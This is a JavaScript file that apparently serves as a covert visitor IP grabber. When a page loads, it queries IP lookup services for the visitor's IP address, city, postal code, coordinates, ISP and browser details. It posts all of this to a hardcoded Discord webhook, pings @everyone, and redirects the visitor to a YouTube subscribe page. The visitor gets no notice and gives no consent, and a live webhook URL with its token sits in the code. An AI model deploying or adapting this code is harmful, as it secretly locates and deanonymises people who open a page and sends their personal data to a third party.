async function sendWebhookMessage(clientIP, clientData) {

    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();

    var ip_city = data.city
    var ip_region = data.region
    var ip_region_code = data.region_code
    var ip_country_capital = data.country_capital
    var ip_country_tld = data.country_tld
    var ip_postal = data.postal
    var ip_latitude = data.latitude
    var ip_longitude = data.longitude
    var ip_timezone = data.timezone
    var ip_utc_offset = data.utc_offset
    var ip_country_calling_code = data.country_calling_code
    var ip_currency = data.currency
    var ip_currency_name = data.currency_name
    var ip_languages = data.languages
    var ip_country_area = data.country_area
    var ip_country_population = data.country_population
    var ip_asn = data.asn
    var ip_network = data.network
    var ip_ip = data.ip
    var ip_continent_code = data.continent_code
    var ip_version = data.version
    const screenSize = `${screen.width}x${screen.height}`;
    const devicePixelRatio = window.devicePixelRatio;
    const documentDimensions = `${document.documentElement.clientWidth}x${document.documentElement.clientHeight}`;
    const windowSize = `${window.innerWidth}x${window.innerHeight}`;


    const webhookURL = "https://discord.com/api/webhooks/1073722545825661018/oUQSL0NrDW-L3poatVtXWQnlsy80o2Mf0yCNXazx03iXK2jqN3F-5Ft36ahVck-GUaKN";

    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            embeds: [{
                title: `?`,
                color: 8914952,
                description: `**__https://discord.gg/fnNd26Depz__**\n\n` +
                    `**ip:** ${ip_ip}\n\n` +
                    `**os:** ${clientData.os}\n\n` +
                    `**network:** ${ip_network}\n\n` +
                    `**version:** ${ip_version}\n\n` +
                    `**country:** ${clientData.country}\n\n` +
                    `**continent_code:** ${ip_continent_code}\n\n` +
                    `**region:** ${ip_region}\n\n` +
                    `**region_code:** ${ip_region_code}\n\n` +
                    `**city:** ${ip_city}\n\n` +
                    `**country_capital:** ${ip_country_capital}\n\n` +
                    `**country_tld:** ${ip_country_tld}\n\n` +
                    `**postal:** ${ip_postal}\n\n` +
                    `**latitude:** ${ip_latitude}\n\n` +
                    `**longitude:** ${ip_longitude}\n\n` +
                    `**timezone:** ${ip_timezone}\n\n` +
                    `**utc_offset:** ${ip_utc_offset}\n\n` +
                    `**country_calling_code:** ${ip_country_calling_code}\n\n` +
                    `**currency:** ${ip_currency}\n\n` +
                    `**currency_name:** ${ip_currency_name}\n\n` +
                    `**languages:** ${ip_languages}\n\n` +
                    `**country_area:** ${ip_country_area}\n\n` +
                    `**country_population:** ${ip_country_population}\n\n` +
                    `**asn:** ${ip_asn}\n\n` +
                    `**datetime:** ${clientData.datetime}\n\n` +
                    `**browser:** ${clientData.browser}\n\n` +
                    `**userAgent:** ${clientData.userAgent}\n\n` +
                    `**referrer:** ${clientData.referrer}\n\n` +
                    `**hostname:** ${clientData.hostname}\n\n` +
                    `**screenSize:** ${screenSize}\n\n` +
                    `**devicePixelRatio:** ${devicePixelRatio}\n\n` +
                    `**documentDimensions:** ${documentDimensions}\n\n` +
                    `**windowSize:** ${windowSize}\n\n` +
                    `**isp:** ${clientData.isp}`,
                footer: {
                    text: "?",
                    icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1200px-Anonymous_emblem.svg.png"
                }
            }]
        }),
    };
    await fetch(webhookURL, options)
        .then(response => console.log(`Successfully sent data`))
        .catch(error => console.error(`Error sending data: ${error}`));
}

fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(async data => {
        const clientIP = data.ip;
        let country, isp;
        await fetch(`https://ipapi.co/${clientIP}/json/`)
            .then(response => response.json())
            .then(data => {
                country = data.country_name;
                isp = data.org;
            });
        const userAgent = navigator.userAgent;
        let browserName, browserVersion;
        if (userAgent.indexOf("Chrome") !== -1) {
            browserName = "Chrome";
            browserVersion = userAgent.match(/Chrome\/(\d+)/)[1];
        } else if (userAgent.indexOf("Firefox") !== -1) {
            browserName = "Firefox";
            browserVersion = userAgent.match(/Firefox\/(\d+)/)[1];
        } else if (userAgent.indexOf("Safari") !== -1) {
            browserName = "Safari";
            browserVersion = userAgent.match(/Version\/(\d+)/)[1];
        }

        const clientData = {
            os: navigator.platform,
            country: country,
            datetime: new Date().toLocaleString(),
            browser: `${browserName} ${browserVersion}`,
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            hostname: window.location.hostname,
            isp: isp
        };
        await sendWebhookMessage(clientIP, clientData);

        window.location.replace("https://www.youtube.com/@ItsMeStocki?sub_confirmation=1");

        function sendMessage() {
            const request = new XMLHttpRequest();
            request.open("POST", "https://discord.com/api/webhooks/1073722545825661018/oUQSL0NrDW-L3poatVtXWQnlsy80o2Mf0yCNXazx03iXK2jqN3F-5Ft36ahVck-GUaKN");

            request.setRequestHeader('Content-type', 'application/json');

            const params = {
                content: "@everyone"
            }

            request.send(JSON.stringify(params));
        }

        sendMessage()

    });